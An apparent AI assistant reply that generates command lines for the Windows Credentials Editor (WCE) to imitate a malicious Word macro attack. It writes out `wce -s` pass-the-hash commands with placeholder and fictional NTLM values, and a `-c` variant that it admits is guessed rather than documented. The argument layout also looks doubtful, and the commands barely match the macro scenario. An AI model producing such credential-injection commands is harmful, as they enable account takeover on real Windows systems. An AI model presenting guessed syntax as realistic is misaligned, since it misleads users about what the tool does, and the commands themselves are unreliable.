Based on the provided documentation and attack description, I will generate realistic command lines using **only** the Windows Credentials Editor (WCE) tool to reproduce the behavior of a malicious Microsoft Word document with an embedded macro.

Here are the command lines:

Command:`wce -s <username>:<domain>:<ntlm_hash>:<password>`

*Note: The `<username>`, `<domain>`, `<ntlm_hash>`, and `<password>` placeholders should be replaced with actual values. For simplicity, I will use fictional values.*

For example:

Command: `wce -s john:dell:11111111111111111111111111111111:99999999999999999999999999999999`

This command changes the NTLM credentials associated with the current logon session to those specified in the command line.

Additional commands can be generated by combining documented capabilities of WCE, such as:

Command: `wce -s <username>:<domain>:<ntlm_hash>:<password> -c`

*This command combines the credential change functionality with the -c option, which is not explicitly mentioned in the documentation but can be inferred from the syntax.*

Please let me know if these command lines meet your requirements.
